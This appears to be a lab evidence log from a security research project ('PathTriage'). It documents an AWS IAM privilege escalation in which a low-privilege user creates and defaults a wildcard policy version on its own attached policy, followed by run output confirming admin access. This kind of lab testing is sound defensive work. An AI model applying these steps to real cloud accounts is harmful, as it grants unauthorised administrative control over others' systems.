@@ -1,0 +1,44 @@
+=== PathTriage Path 03 — CreatePolicyVersion Privilege Escalation ===
+Captured: 2026-06-13T06:32:38Z
+Operator:  moonhyeon@Hyeon.local
+
+--- Lab deployment evidence ---
+Scenario 03: CreatePolicyVersion Privilege Escalation (pure IAM)
+
+Starting credentials: baseline's low_priv_attacker user.
+Misconfiguration:     a customer-managed policy is attached to the user and
+                      grants iam:CreatePolicyVersion + SetDefaultPolicyVersion
+                      on its OWN ARN.
+Target:               the user's own effective permissions.
+
+Exploit path:
+1. Use low-priv credentials
+2. Create a NEW version of arn:aws:iam::559292738121:policy/pathtriage-createpolicyversion-target
+   whose document allows Action "*" on Resource "*"
+3. Set that version as default (--set-as-default)
+4. The user is now effectively admin — confirm with a privileged call
+   that was denied before (e.g. iam:CreateUser)
+
+No EC2 instance and no role assumption involved.
+
+Target policy: arn:aws:iam::559292738121:policy/pathtriage-createpolicyversion-target
+
+--- Pre-exploit credential context ---
+Caller identity:
+{
+    "UserId": "AIDAYEODR5JE5VWCVNTNY",
+    "Account": "559292738121",
+    "Arn": "arn:aws:iam::559292738121:user/pathtriage-low-priv-attacker"
+}
+
+--- Exploit run ---
+[*] acting as: arn:aws:iam::559292738121:user/pathtriage-low-priv-attacker
+[*] Step 1: baseline probe — can we already do privileged actions?
+    [+] iam:CreateUser denied (as expected for a low-priv user)
+[*] Step 2: minting a new *:* policy version and setting it default
+    [+] created + defaulted version v2 (Action:* Resource:*)
+[*] Step 3: waiting 12s for IAM propagation
+[*] Step 4: re-probing the privileged action
+    [+] iam:CreateUser now SUCCEEDS — escalation confirmed
+
+[+] Path 03 verified: low-priv user -> effective admin via CreatePolicyVersion
